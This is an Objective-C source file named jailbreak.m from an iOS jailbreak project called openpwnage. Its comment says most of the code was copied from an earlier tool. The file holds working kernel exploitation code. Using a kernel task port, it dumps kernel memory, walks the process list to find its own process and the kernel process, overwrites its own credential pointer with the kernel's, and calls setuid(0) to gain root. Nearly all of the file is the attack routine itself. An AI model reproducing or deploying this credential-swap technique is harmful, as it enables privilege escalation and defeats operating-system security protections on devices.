//
//  jailbreak.m
//  openpwnage
//
//  Created by Zachary Keffaber on 4/24/22.
//

//99% of this is stolen from spv

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#import <sys/types.h>
#include "patchfinder.h"
#include <sys/utsname.h>
#include <UIKit/UIKit.h>

#define UNSLID_BASE 0x80001000


uint32_t kread_uint32(uint32_t addr, task_t tfp0) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0,
                      addr,
                      4,
                      (vm_address_t)&ret,
                      &bytesRead);
    return ret;
}


uint8_t* dump_kernel(uint8_t* kdata, uint32_t len, task_t tfp0, uintptr_t kaslr_slide) {
    vm_size_t segment = 0x800;
    
    for (int i = 0; i < len / segment; i++) {
        
        vm_read_overwrite(tfp0,
                          UNSLID_BASE + kaslr_slide + (i * segment),
                          segment,
                          (vm_address_t)kdata + (i * segment),
                          &segment);
    }
    
    return kdata;
}
 

bool rootify(task_t tfp0, uintptr_t kernel_base, uintptr_t kaslr_slide){
    printf("stealing kernel creds");
    
    uint32_t len                = 32 * 1024 * 1024;
    uint8_t* kdata                = NULL;
    char* version_string        = (char*)[[[UIDevice currentDevice] systemVersion]
                                              UTF8String];
    kdata = malloc(len);
    dump_kernel(kdata, len, tfp0, kaslr_slide);
    if (!kdata) {
        printf("fuck");
        exit(42);
    }
    
    uint32_t allproc_read    = kread_uint32(kernel_base + find_allproc(kernel_base, kdata, len, version_string), tfp0);
    printf("uint32_t allproc = 0x%08lx, uint32_t allproc_read = 0x%08x;",
               kernel_base + find_allproc(kernel_base, kdata, len, version_string),
                allproc_read);
        pid_t our_pid        = getpid();
        printf("our_pid = %d", our_pid);
    
    uint32_t myproc                = 0;
    uint32_t kernproc    = 0;
    
    if (allproc_read != 0) {
        while (myproc == 0 || kernproc == 0) {
            uint32_t kpid = kread_uint32(allproc_read + 8, tfp0);
            if (kpid == our_pid) {
                myproc = allproc_read;
                printf("found myproc 0x%08x, %d", myproc, kpid);
            } else if (kpid == 0) {
                kernproc = allproc_read;
                printf("found kernproc 0x%08x, %d", kernproc, kpid);
            }
            allproc_read = kread_uint32(allproc_read, tfp0);
        }
    } else {
        // fail
        return false;
    }
    
    uint32_t kern_ucred = kread_uint32(kernproc + 0xa4, tfp0);
    printf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
        
    uint32_t ourcred = kread_uint32(myproc + 0xa4, tfp0);
    printf("uint32_t ourcred = 0x%08x;", ourcred);
    vm_write(tfp0,
             myproc + 0xa4,
             (vm_offset_t)&kern_ucred,
             4);
    setuid(0);
        
    return true;
}
